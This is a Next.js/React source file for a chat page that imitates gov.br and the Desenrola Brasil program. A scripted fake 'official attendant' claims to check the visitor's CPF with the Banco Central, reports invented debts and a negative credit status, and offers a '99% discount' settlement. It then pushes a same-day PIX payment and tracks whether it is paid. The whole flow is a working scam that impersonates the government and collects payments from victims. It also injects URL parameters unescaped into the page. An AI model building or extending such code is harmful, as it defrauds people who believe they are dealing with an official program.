'use client'

import QRCode from 'qrcode'
import { useEffect, useRef } from 'react'

function onlyDigits(s: string) {
  return String(s || '').replace(/\D/g, '')
}

function formatCPF(cpf: string) {
  const d = onlyDigits(cpf).slice(0, 11)
  if (d.length <= 3) return d
  if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3)
  if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6)
  return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9)
}

function codeFromCPF(cpf: string) {
  const d = onlyDigits(cpf)
  let h = 5381
  for (let i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0
  const s = h.toString(36).toUpperCase().padStart(8, 'X')
  return (s.slice(0, 5) + '-' + s.slice(5, 9) + '-' + s.slice(9, 13) + '-' + s.slice(13, 17)).slice(0, 17)
}

export default function AtendimentoClient() {
  const msgsRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const msgs = msgsRef.current
    if (!msgs) return

    // Começa sempre com o feed limpo (evita duplicação no StrictMode/dev).
    msgs.innerHTML = ''

    // ---- Identificação ----
    const p = new URLSearchParams(window.location.search)
    let NOME = p.get('nome') || ''
    let CPF = p.get('cpf') || ''
    let NASC = p.get('nasc') || ''
    try {
      NOME = NOME || localStorage.getItem('site.nome') || 'Contribuinte'
      CPF = CPF || localStorage.getItem('site.cpf') || ''
      NASC = NASC || localStorage.getItem('site.nasc') || ''
      if (NOME && NOME !== 'Contribuinte') localStorage.setItem('site.nome', NOME)
      if (CPF) localStorage.setItem('site.cpf', CPF)
      if (NASC) localStorage.setItem('site.nasc', NASC)
    } catch {}

    const NOME_COMPLETO = NOME
    const CPF_FORMATADO = formatCPF(CPF)
    const CODIGO_ACORDO = codeFromCPF(CPF)
    const VALOR = 'R$ 10,92'
    const AVATAR = '/images/leticia.png'

    const nomeEl = document.getElementById('nomeUsuario')
    if (nomeEl) nomeEl.textContent = (NOME.split(' ')[0] || 'Usuário').toUpperCase()

    let currentAudio: HTMLAudioElement | null = null
    let cancelled = false

    function tag(t: string) {
      return (t || '')
        .replace(/\{NOME\}/g, NOME)
        .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
        .replace(/\{CPF\}/g, CPF)
        .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
        .replace(/\{NASC\}/g, NASC)
        .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
        .replace(/\{VALOR\}/g, VALOR)
    }

    const scroll = () =>
      setTimeout(() => {
        if (msgs) msgs.scrollTop = msgs.scrollHeight
      }, 60)
    const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms))

    function addTyping() {
      const row = document.createElement('div')
      row.className = 'msg-row'
      row.id = 'typing-row'
      row.innerHTML =
        '<img class="avatar" src="' + AVATAR + '" alt="Letícia"><div class="typing"><span></span><span></span><span></span></div>'
      msgs!.appendChild(row)
      scroll()
    }
    function removeTyping() {
      const el = document.getElementById('typing-row')
      if (el) el.remove()
    }
    function botRow(inner: string) {
      const row = document.createElement('div')
      row.className = 'msg-row'
      row.innerHTML = '<img class="avatar" src="' + AVATAR + '" alt="Letícia">' + inner
      msgs!.appendChild(row)
      scroll()
    }
    function addUser(text: string) {
      const row = document.createElement('div')
      row.className = 'msg-row user'
      row.innerHTML = '<div class="bubble-user">' + tag(text) + '</div>'
      msgs!.appendChild(row)
      scroll()
    }
    function addSystem(text: string) {
      const row = document.createElement('div')
      row.className = 'msg-row'
      row.innerHTML = '<div class="bubble-system">' + tag(text) + '</div>'
      msgs!.appendChild(row)
      scroll()
    }
    function addImage(src: string) {
      const row = document.createElement('div')
      row.className = 'msg-row'
      const img = document.createElement('img')
      img.src = src
      img.alt = 'Imagem'
      img.style.cssText =
        'width:100%;max-width:280px;border-radius:16px;margin-top:6px;box-shadow:0 6px 20px rgba(0,0,0,0.12);'
      row.appendChild(img)
      msgs!.appendChild(row)
      scroll()
    }

    function addVideoAutoplay(src: string) {
      const row = document.createElement('div')
      row.className = 'msg-row'
      const container = document.createElement('div')
      container.style.cssText =
        'position:relative;display:inline-block;width:100%;max-width:280px;border-radius:16px;overflow:hidden;box-shadow:0 6px 20px rgba(0,0,0,0.12);margin-top:6px;background:#000;'
      const video = document.createElement('video')
      video.src = src
      video.autoplay = true
      video.playsInline = true
      video.setAttribute('playsinline', '')
      video.setAttribute('webkit-playsinline', '')
      video.style.cssText = 'border-radius:16px;width:100%;height:auto;display:block;object-fit:contain;'

      const controls = document.createElement('div')
      controls.style.cssText =
        'position:absolute;bottom:8px;left:8px;display:flex;align-items:center;gap:6px;background:rgba(0,0,0,0.5);border-radius:20px;padding:4px 8px;'
      const playSvg = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>'
      const pauseSvg =
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>'
      const playPauseBtn = document.createElement('button')
      playPauseBtn.style.cssText = 'background:none;border:none;cursor:pointer;display:flex;padding:0;'
      playPauseBtn.innerHTML = pauseSvg
      controls.appendChild(playPauseBtn)

      let isPlaying = true
      function attemptPlay() {
        const pr = video.play()
        if (pr && (pr as Promise<void>).catch) {
          ;(pr as Promise<void>).catch(() => {
            // autoplay bloqueado — inicia mudo
            video.muted = true
            video.play().catch(() => {})
          })
        }
      }
      playPauseBtn.onclick = (e) => {
        e.stopPropagation()
        if (video.paused) {
          video.play()
          isPlaying = true
          playPauseBtn.innerHTML = pauseSvg
        } else {
          video.pause()
          isPlaying = false
          playPauseBtn.innerHTML = playSvg
        }
      }
      container.onclick = (e) => {
        if (e.target === video || e.target === container) {
          if (video.paused) {
            video.play()
            isPlaying = true
            playPauseBtn.innerHTML = pauseSvg
          } else {
            video.pause()
            isPlaying = false
            playPauseBtn.innerHTML = playSvg
          }
        }
      }
      void isPlaying

      container.appendChild(video)
      container.appendChild(controls)
      row.appendChild(container)
      msgs!.appendChild(row)
      attemptPlay()
      scroll()
    }

    function addAudio(src: string) {
      const row = document.createElement('div')
      row.className = 'msg-row'
      const wrapper = document.createElement('div')
      wrapper.style.cssText = 'display:flex;align-items:flex-end;'
      const avatarImg = document.createElement('img')
      avatarImg.className = 'avatar'
      avatarImg.src = AVATAR

      const audio = document.createElement('audio')
      audio.src = src
      audio.preload = 'auto'
      audio.autoplay = true
      currentAudio = audio

      const card = document.createElement('div')
      card.className = 'gov-audio-card'

      const playBtn = document.createElement('button')
      playBtn.className = 'audio-play-btn'
      const playSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>'
      const pauseSvg =
        '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>'
      playBtn.innerHTML = pauseSvg

      const trackInfo = document.createElement('div')
      trackInfo.className = 'audio-track-info'
      const trackBar = document.createElement('div')
      trackBar.className = 'audio-track-bar'
      const trackFill = document.createElement('div')
      trackFill.className = 'audio-track-fill'
      trackBar.appendChild(trackFill)
      const timeDiv = document.createElement('div')
      timeDiv.className = 'audio-track-time'
      timeDiv.innerHTML = '<span>Mensagem de Voz</span><span class="audio-time">0:00 / 0:00</span>'
      trackInfo.appendChild(trackBar)
      trackInfo.appendChild(timeDiv)

      audio.load()
      const pr = audio.play()
      if (pr && (pr as Promise<void>).catch) {
        ;(pr as Promise<void>).catch(() => {
          playBtn.innerHTML = playSvg
        })
      }

      playBtn.onclick = () => {
        if (!audio.paused) {
          audio.pause()
          playBtn.innerHTML = playSvg
        } else {
          audio.play()
          playBtn.innerHTML = pauseSvg
        }
      }
      audio.onended = () => {
        playBtn.innerHTML = playSvg
      }
      audio.ontimeupdate = () => {
        if (isNaN(audio.duration)) return
        const percent = (audio.currentTime / audio.duration) * 100
        trackFill.style.width = percent + '%'
        const curMins = Math.floor(audio.currentTime / 60)
        const curSecs = Math.floor(audio.currentTime % 60)
        const durMins = Math.floor(audio.duration / 60)
        const durSecs = Math.floor(audio.duration % 60)
        const timeStr =
          curMins + ':' + String(curSecs).padStart(2, '0') + ' / ' + durMins + ':' + String(durSecs).padStart(2, '0')
        const t = timeDiv.querySelector('.audio-time')
        if (t) t.textContent = timeStr
      }
      trackBar.onclick = (e) => {
        const rect = trackBar.getBoundingClientRect()
        const percent = (e.clientX - rect.left) / rect.width
        if (!isNaN(audio.duration)) audio.currentTime = percent * audio.duration
      }

      card.appendChild(playBtn)
      card.appendChild(trackInfo)
      wrapper.appendChild(avatarImg)
      wrapper.appendChild(card)
      row.appendChild(wrapper)
      msgs!.appendChild(row)
      scroll()
    }

    // Toca áudio e executa a ação ~2.5s antes do fim (ou no onended / fallback 45s)
    function addAudioThen(audioSrc: string, onAction: () => Promise<unknown>) {
      addAudio(audioSrc)
      return new Promise<void>((resolve) => {
        const audio = currentAudio!
        let actionExecuted = false
        let checkInterval: ReturnType<typeof setInterval> | null = null

        function executeCallback() {
          if (!actionExecuted) {
            actionExecuted = true
            if (checkInterval) clearInterval(checkInterval)
            onAction().then(() => resolve()).catch(() => resolve())
          }
        }
        function setupMonitoring() {
          const duration = audio.duration
          if (duration && duration > 0) {
            const executeAt = Math.max(0, duration - 2.5)
            checkInterval = setInterval(() => {
              if (audio.currentTime >= executeAt && !actionExecuted) executeCallback()
            }, 100)
            audio.onended = executeCallback
          }
        }
        if (audio.readyState >= 1) setupMonitoring()
        else audio.onloadedmetadata = setupMonitoring
        setTimeout(executeCallback, 45000)
      })
    }

    function addAudioWithButton(audioSrc: string, buttonText: string) {
      return addAudioThen(audioSrc, () => addButtons([buttonText], false, true, true))
    }

    function infoCard(lines: { text: string; style?: string }[]) {
      let html = '<div class="bubble-info-card">'
      lines.forEach((l) => {
        const cls = ({ label: 'ic-label', value: 'ic-value', bold: 'ic-bold' } as Record<string, string>)[l.style || ''] || 'ic-label'
        html += '<div class="' + cls + '">' + tag(l.text) + '</div>'
      })
      html += '</div>'
      botRow(html)
    }

    function addButtons(options: string[], wide: boolean, solid: boolean, right: boolean) {
      return new Promise<string>((resolve) => {
        const wrap = document.createElement('div')
        wrap.style.marginBottom = '10px'
        if (right) {
          wrap.style.display = 'flex'
          wrap.style.justifyContent = 'flex-end'
        } else {
          wrap.style.marginLeft = '40px'
        }
        const row = document.createElement('div')
        row.className = wide ? 'btn-row' : 'btn-row row-inline'
        options.forEach((opt) => {
          const btn = document.createElement('button')
          btn.className = 'chat-btn' + (wide ? ' wide solid' : '') + (!wide && solid ? ' solid' : '')
          btn.textContent = opt
          btn.onclick = () => {
            wrap.remove()
            addUser(opt)
            resolve(opt)
          }
          row.appendChild(btn)
        })
        wrap.appendChild(row)
        msgs!.appendChild(wrap)
        scroll()
      })
    }

    async function botSay(html: string) {
      addTyping()
      await sleep(1100)
      if (cancelled) return
      removeTyping()
      botRow('<div class="bubble-bot">' + tag(html) + '</div>')
      await sleep(800)
    }

    async function continueFlow() {
      await sleep(500)
      await botSay('Obrigada pela confirmação!')
      await botSay('Conectando à sua conta gov.br...')
      await botSay('<strong>Autenticação efetuada com sucesso!</strong>')
      await botSay('<strong>{NOME_COMPLETO}</strong><br>Você possui condições especiais de renegociação com as instituições conveniadas:')
      addImage('/images/image2.png')

      await addButtons(['CONTINUAR'], false, true, true)
      await addAudioWithButton('/assets/desktop2026.mp3', 'SIM! QUERO NEGOCIAR')

      await botSay('<em>Consultando o Sistema de Informações de Crédito (SCR) do Banco Central e bases conveniadas...</em>')
      await sleep(2600)
      await botSay('<em>Localizando registros ativos em seu CPF...</em>')
      await sleep(2600)
      await botSay('<strong>Consulta concluída!</strong>')
      await sleep(2000)
      await botSay('Identificamos <strong>4 dívidas ativas</strong> em aberto. Os valores acumulados totalizam entre <strong>R$ 1.728,74 e R$ 5.278,23</strong> vinculados ao seu CPF.')
      await sleep(2600)

      infoCard([
        { text: 'Situação do Documento:', style: 'label' },
        { text: 'CPF: {CPF_FORMATADO}', style: 'value' },
        { text: 'STATUS: RESTRITO / NEGATIVADO.', style: 'bold' },
      ])

      await botSay('Seu índice de SCORE atual encontra-se classificado como <strong>Baixo / Risco de Crédito:</strong>')
      addImage('/assets/score.jpg')
      await botSay('Deseja consultar a proposta de acordo com subsídio oficial e desconto especial disponível para você?')
      await addButtons(['BUSCAR ACORDO'], false, true, true)

      await botSay('<em>Aplicando diretrizes do Programa Desenrola Brasil...</em>')
      await botSay('<strong>Proposta de Quitação Localizada!</strong>')
      infoCard([
        { text: '1 (uma) proposta de quitação integral gerada para:', style: 'bold' },
        { text: '{NOME_COMPLETO}', style: 'value' },
        { text: 'Documento: {CPF_FORMATADO}', style: 'value' },
      ])
      await addButtons(['VER ACORDO'], false, true, true)

      await addAudioThen('/assets/buscaacordo.mp3', async () => {
        await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Sua proposta foi aprovada com <strong>99% DE DESCONTO</strong> pelo Programa Oficial!')
      })

      await botSay('<em>Acessando o Termo de Acordo <strong>{CODIGO_ACORDO}</strong>...</em>')
      await botSay('Termo de Homologação <strong><em>{CODIGO_ACORDO}</em></strong> emitido para <strong>{NOME_COMPLETO}</strong> (CPF: {CPF_FORMATADO})')
      await botSay('O termo é intransferível e exclusivo para o titular portador do CPF <strong>{CPF_FORMATADO}</strong>.')
      await botSay('Deseja confirmar o acordo com <strong>99% DE DESCONTO</strong> para liquidar todas as dívidas e restabelecer seu crédito por apenas <strong>{VALOR}</strong>?')
      await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'], false, true, true)

      await addAudioThen('/assets/parabens.mp3', async () => {
        await botSay('<strong>Acordo confirmado com sucesso!</strong>')
        return addButtons(['CONTINUAR'], false, true, true)
      })

      await addAudioThen('/assets/pagamento.mp3', async () => {
        infoCard([
          { text: 'Protocolo de Homologação: {CODIGO_ACORDO}', style: 'label' },
          { text: 'Beneficiário(a):', style: 'label' },
          { text: '{NOME_COMPLETO}', style: 'bold' },
          { text: 'Documento (CPF):', style: 'label' },
          { text: '{CPF_FORMATADO}', style: 'bold' },
          { text: 'Quitação e Baixa de Todas as Dívidas Ativas no CPF.', style: 'value' },
          { text: 'Restabelecimento do Score (+895 Pontos).', style: 'bold' },
          { text: 'Valor Final Homologado: {VALOR}', style: 'label' },
        ])
        return addButtons(['CONTINUAR PARA O PAGAMENTO'], false, true, true)
      })

      await addAudioThen('/assets/aviso.mp3', async () => {
        await botSay('<strong><em>Atenção!</em></strong> <em>Condição homologada válida apenas para liquidação no dia de hoje.</em>')
        return botSay('<em>Clique no botão abaixo para gerar sua Guia Oficial de Pagamento com Chave PIX.</em>')
      })

      await sleep(600)
      const finRow = document.createElement('div')
      finRow.style.cssText = 'margin-left:40px;margin-bottom:12px;width:calc(100% - 40px);'
      const finBtn = document.createElement('button')
      finBtn.className = 'btn-link-final'
      finBtn.textContent = 'GERAR GUIA DE PAGAMENTO PIX'
      finBtn.onclick = async () => {
        finBtn.disabled = true
        finBtn.textContent = 'GERANDO GUIA OFICIAL...'
        try {
          const apiResp = await fetch('/api/pix', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tipo: 'acordo' }),
          })
          const result = await apiResp.json()
          if (!result.ok) throw new Error(result.error || 'Erro ao gerar PIX')
          const pixCode = result.qrCode || ''
          if (!pixCode) throw new Error('Código PIX não recebido')

          finRow.remove()
          await botSay('Aqui está a sua <strong>Guia Oficial de Pagamento PIX</strong>:')

          const pixContainer = document.createElement('div')
          pixContainer.className = 'pix-container'
          pixContainer.innerHTML =
            '<div class="pix-header-badge">Guia Homologada gov.br</div>' +
            '<div class="pix-title">Pagamento via PIX Instantâneo</div>' +
            '<div class="pix-sub">Valor do Acordo: <strong>' + VALOR + '</strong></div>' +
            '<div class="qrcode-wrapper"><img class="qrcode-img" alt="QR Code PIX"></div>' +
            '<div class="pix-copy-paste" title="Clique para copiar">' + pixCode + '</div>' +
            '<button class="chat-btn solid wide copy-btn">COPIAR CÓDIGO PIX</button>' +
            '<div class="pix-status"><div class="spinner"></div> Aguardando confirmação do Banco Central...</div>'
          msgs!.appendChild(pixContainer)
          scroll()

          const qrImg = pixContainer.querySelector('.qrcode-img') as HTMLImageElement
          const baseImg = result.qrCodeBase64 as string | null
          if (baseImg) {
            qrImg.src = baseImg
          } else {
            try {
              qrImg.src = await QRCode.toDataURL(pixCode, { width: 190, margin: 1 })
            } catch {
              qrImg.src =
                'https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(pixCode)
            }
          }

          const copyBtn = pixContainer.querySelector('.copy-btn') as HTMLButtonElement
          copyBtn.onclick = () => {
            navigator.clipboard.writeText(pixCode)
            copyBtn.textContent = 'CÓDIGO PIX COPIADO!'
            copyBtn.style.backgroundColor = '#168821'
            copyBtn.style.borderColor = '#168821'
            setTimeout(() => {
              copyBtn.textContent = 'COPIAR CÓDIGO PIX'
              copyBtn.style.backgroundColor = ''
              copyBtn.style.borderColor = ''
            }, 2500)
          }

          const transactionId = result.transactionId
          if (transactionId) {
            const pollInterval = setInterval(async () => {
              try {
                const stResp = await fetch('/api/pix/status?id=' + encodeURIComponent(transactionId), { cache: 'no-store' })
                const statusRes = await stResp.json()
                const status = String(statusRes.status || '').toLowerCase()
                if (['paid', 'completed', 'approved', 'authorized'].includes(status)) {
                  clearInterval(pollInterval)
                  const st = pixContainer.querySelector('.pix-status') as HTMLElement
                  st.innerHTML = '<strong>Pagamento Confirmado no Sistema!</strong>'
                  st.style.color = '#168821'
                  await sleep(1200)
                  await botSay('<strong>Pagamento confirmado com sucesso!</strong>')
                  await botSay('Seu processo de baixa de restrições foi iniciado. Redirecionando para emissão da certidão oficial...')
                  await sleep(2000)
                  const rp = new URLSearchParams(window.location.search)
                  rp.set('cpf', CPF)
                  rp.set('nome', NOME_COMPLETO)
                  rp.set('paid', 'true')
                  window.location.href = '/regularizacao?' + rp.toString()
                }
              } catch (e) {
                console.log('[v0] Erro no polling:', e)
              }
            }, 4500)
          }
        } catch (error) {
          console.log('[v0] Erro ao gerar PIX:', error)
          alert('Erro ao gerar PIX. Tente novamente.')
          finBtn.disabled = false
          finBtn.textContent = 'GERAR GUIA DE PAGAMENTO PIX'
        }
      }
      finRow.appendChild(finBtn)
      msgs!.appendChild(finRow)
      scroll()
    }

    async function startFlow() {
      if (!NOME || !CPF) {
        addSystem('<em>(Dados de identificação ausentes. Redirecionando para a consulta...)</em>')
        setTimeout(() => {
          window.location.href = '/'
        }, 1800)
        return
      }

      addImage('/images/image1.png')
      await botSay('Olá <strong>{NOME_COMPLETO}</strong>, seja bem-vindo(a) ao canal oficial de atendimento do <strong>Programa Desenrola Brasil</strong>. Seus dados estão protegidos sob sigilo fiscal e criptografia de ponta a ponta.')
      await botSay('Aguarde um instante, nossa atendente especializada já está assumindo o seu atendimento.')
      addVideoAutoplay('/assets/video15.mp4')
      addSystem('<em>(Atendente Letícia M. conectou-se ao atendimento seguro)</em>')

      await sleep(15000)
      if (cancelled) return

      const confirmWrap = document.createElement('div')
      confirmWrap.style.marginLeft = '40px'
      confirmWrap.style.marginBottom = '10px'
      const cCard = document.createElement('div')
      cCard.className = 'confirm-card'
      cCard.innerHTML =
        '<span class="confirm-title">Para sua segurança, confirme os dados cadastrais:</span>' +
        '<strong>Nome do Titular:</strong><span>' + NOME_COMPLETO + '</span>' +
        '<strong>CPF:</strong><span>' + CPF_FORMATADO + '</span>' +
        (NASC ? '<strong>Data de Nascimento:</strong><span>' + NASC + '</span>' : '')
      const btnsConfirm = document.createElement('div')
      btnsConfirm.className = 'confirm-btns'
      ;['Sim, está correto.', 'Não sou eu'].forEach((label) => {
        const btn = document.createElement('button')
        btn.className = 'chat-btn' + (label.indexOf('Sim') === 0 ? ' solid' : '')
        btn.textContent = label
        btn.onclick = () => {
          confirmWrap.remove()
          addUser(label)
          if (label.indexOf('Sim') === 0) continueFlow()
          else {
            setTimeout(async () => {
              await botSay('Por favor, informe o CPF correto para prosseguir com a renegociação.')
              setTimeout(() => {
                window.location.href = '/'
              }, 1500)
            }, 600)
          }
        }
        btnsConfirm.appendChild(btn)
      })
      confirmWrap.appendChild(cCard)
      confirmWrap.appendChild(btnsConfirm)
      msgs!.appendChild(confirmWrap)
      scroll()
    }

    const t = setTimeout(startFlow, 350)
    return () => {
      cancelled = true
      clearTimeout(t)
      if (currentAudio) currentAudio.pause()
    }
  }, [])

  return (
    <div className="chat-root">
      <style>{CSS}</style>

      <div className="page-chat">
        <div className="barra-brasil">
          <div className="barra-brasil-logo">
            <svg className="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11">
              <rect width="20" height="14" fill="#009c3b" />
              <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00" />
              <circle cx="10" cy="7" r="3.2" fill="#002776" />
              <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff" />
            </svg>
            <strong>BRASIL</strong>
          </div>
          <nav className="barra-brasil-nav">
            <a href="javascript:void(0)">Simplifique!</a>
            <a href="javascript:void(0)">Participe</a>
            <a href="javascript:void(0)">Acesso à informação</a>
            <a href="javascript:void(0)">Legislação</a>
            <a href="javascript:void(0)">Canais</a>
          </nav>
        </div>

        <header className="chat-header">
          <div className="chat-header-brand">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/images/iconegov.png" alt="gov.br" />
          </div>
          <button className="btn-user">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
            <span id="nomeUsuario">Usuário</span>
          </button>
        </header>

        <div className="attendant-strip">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src="/images/leticia.png" alt="Letícia M." />
          <div className="att-info">
            <div className="att-nome">
              Letícia M.
              <span className="att-verified-badge" title="Atendente Oficial Verificada">
                ✓
              </span>
            </div>
            <div className="att-cargo">Atendente Oficial — Programa Desenrola Brasil</div>
          </div>
        </div>

        <div className="chat-msgs" id="msgs" ref={msgsRef} />

        <footer className="site-footer">
          <div className="gv">
            gov<span>.br</span>
          </div>
          <div className="gv-sub">
            Este é um site privado e independente, sem vínculo com o Governo Federal ou o gov.br.
          </div>
          <div className="gv-copy">Programa Desenrola Brasil</div>
        </footer>
      </div>
    </div>
  )
}

const CSS = `
.chat-root, .chat-root *, .chat-root *::before, .chat-root *::after { box-sizing: border-box; margin: 0; padding: 0; }
.chat-root {
  font-family: 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  background: #f0f2f5;
  color: #1a1a1a;
  height: 100vh;
  height: 100dvh;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  -webkit-font-smoothing: antialiased;
}
.chat-root .barra-brasil { background: #000; color: #fff; font-size: 11px; font-weight: 600; padding: 4px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #222; flex-shrink: 0; }
.chat-root .barra-brasil-logo { display: flex; align-items: center; gap: 6px; color: #fff; font-weight: 800; font-size: 11px; letter-spacing: 0.04em; }
.chat-root .flag-icon-svg { display: inline-block; vertical-align: middle; border-radius: 1.5px; flex-shrink: 0; }
.chat-root .barra-brasil-nav { display: flex; align-items: center; gap: 12px; }
.chat-root .barra-brasil-nav a { color: #9ca3af; text-decoration: none; font-size: 10px; }
@media (max-width: 500px) { .chat-root .barra-brasil-nav { display: none; } }
.chat-root .page-chat { display: flex; flex-direction: column; flex: 1; height: 100%; max-width: 720px; width: 100%; margin: 0 auto; background: #f0f2f5; position: relative; }
.chat-root .chat-header { background: #fff; border-bottom: 2.5px solid #1351B4; box-shadow: 0 1px 4px rgba(0,0,0,.08); height: 56px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; flex-shrink: 0; z-index: 10; }
.chat-root .chat-header-brand { display: flex; align-items: center; gap: 10px; }
.chat-root .chat-header img { height: 32px; width: auto; }
.chat-root .btn-user { background: #1351B4; color: #fff; border: none; border-radius: 50px; padding: 6px 14px; display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; font-family: inherit; box-shadow: 0 2px 6px rgba(19,81,180,0.25); }
.chat-root .attendant-strip { background: #fff; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 12px; padding: 8px 16px; flex-shrink: 0; height: 58px; }
.chat-root .attendant-strip img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex-shrink: 0; border: 2px solid #1351B4; }
.chat-root .att-info { display: flex; flex-direction: column; }
.chat-root .att-nome { font-weight: 800; font-size: 13.5px; color: #1e293b; display: flex; align-items: center; gap: 5px; }
.chat-root .att-verified-badge { display: inline-flex; align-items: center; justify-content: center; width: 14px; height: 14px; background: #1351B4; color: #fff; border-radius: 50%; font-size: 9px; font-weight: 900; }
.chat-root .att-cargo { font-size: 11.5px; color: #64748b; font-weight: 500; }
.chat-root .chat-msgs { flex: 1 1 auto; overflow-y: auto; padding: 16px 14px 28px; width: 100%; margin: 0 auto; scroll-behavior: smooth; }
.chat-root .msg-row { display: flex; margin-bottom: 10px; align-items: flex-end; }
.chat-root .msg-row.user { justify-content: flex-end; }
.chat-root .avatar { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; flex-shrink: 0; margin-right: 8px; margin-bottom: 2px; border: 1.5px solid #1351B4; }
.chat-root .bubble-bot { background: #fff; color: #1e293b; border: 1px solid #e2e8f0; border-radius: 18px 18px 18px 4px; padding: 12px 16px; font-size: 14px; line-height: 1.55; max-width: 82%; box-shadow: 0 2px 8px rgba(0,0,0,.05); overflow-wrap: break-word; animation: fadeUp .3s ease both; }
.chat-root .bubble-user { background: linear-gradient(135deg, #1351B4, #0C326F); color: #fff; border-radius: 18px 18px 4px 18px; padding: 12px 16px; font-size: 14px; line-height: 1.55; max-width: 82%; overflow-wrap: break-word; box-shadow: 0 2px 8px rgba(19,81,180,0.25); animation: fadeUp .3s ease both; }
.chat-root .bubble-system { color: #64748b; font-size: 12px; font-style: italic; padding: 6px 12px; text-align: center; animation: fadeUp .3s ease both; width: 100%; }
.chat-root .bubble-info-card { background: #EFF6FF; border: 1.5px solid #BFDBFE; border-radius: 14px; padding: 16px; font-size: 13.5px; line-height: 1.7; max-width: 86%; box-shadow: 0 3px 10px rgba(19,81,180,0.06); animation: fadeUp .3s ease both; }
.chat-root .ic-label { color: #475569; font-size: 12.5px; font-weight: 500; }
.chat-root .ic-value { color: #1351B4; font-weight: 700; font-size: 14px; }
.chat-root .ic-bold { font-weight: 800; color: #0f172a; font-size: 14.5px; }
.chat-root .confirm-card { background: #fff; border: 1px solid #cbd5e1; border-radius: 12px; padding: 16px; font-size: 13.5px; line-height: 1.6; margin-bottom: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
.chat-root .confirm-title { font-weight: 800; display: block; color: #0f172a; margin-bottom: 10px; border-bottom: 1px solid #f1f5f9; padding-bottom: 6px; }
.chat-root .confirm-card strong { display: block; color: #475569; font-size: 12px; text-transform: uppercase; letter-spacing: 0.03em; }
.chat-root .confirm-card span { display: block; color: #1351B4; font-weight: 700; margin-bottom: 6px; font-size: 14px; }
.chat-root .confirm-btns { display: flex; gap: 10px; justify-content: flex-end; flex-wrap: wrap; margin-top: 8px; }
.chat-root .btn-row { display: flex; flex-direction: column; gap: 8px; margin-top: 4px; animation: fadeUp .3s ease both; }
.chat-root .btn-row.row-inline { flex-direction: row; flex-wrap: wrap; }
.chat-root .chat-btn { background: #fff; border: 2px solid #1351B4; color: #1351B4; border-radius: 24px; padding: 11px 20px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; transition: all .2s; box-shadow: 0 2px 6px rgba(19,81,180,0.12); }
.chat-root .chat-btn:hover, .chat-root .chat-btn.solid { background: #1351B4; color: #fff; }
.chat-root .chat-btn.wide { border-radius: 12px; text-transform: uppercase; font-size: 14.5px; font-weight: 800; letter-spacing: .03em; padding: 15px 20px; width: 100%; text-align: center; }
.chat-root .chat-btn:disabled { opacity: .6; pointer-events: none; }
.chat-root .btn-link-final { display: block; width: 100%; background: #168821; color: #fff; text-align: center; font-size: 15px; font-weight: 800; letter-spacing: .03em; text-transform: uppercase; border-radius: 12px; padding: 16px 20px; border: none; cursor: pointer; box-shadow: 0 4px 14px rgba(22,136,33,0.35); animation: fadeUp .3s ease both; transition: all 0.2s; }
.chat-root .btn-link-final:hover { background: #13741c; transform: translateY(-1px); }
.chat-root .typing { display: inline-flex; align-items: center; gap: 4px; padding: 12px 16px; background: #fff; border-radius: 18px 18px 18px 4px; border: 1px solid #e2e8f0; box-shadow: 0 2px 6px rgba(0,0,0,.05); }
.chat-root .typing span { width: 7px; height: 7px; background: #1351B4; border-radius: 50%; animation: bounce 1.2s infinite; }
.chat-root .typing span:nth-child(2) { animation-delay: .2s; }
.chat-root .typing span:nth-child(3) { animation-delay: .4s; }
@keyframes bounce { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
@keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
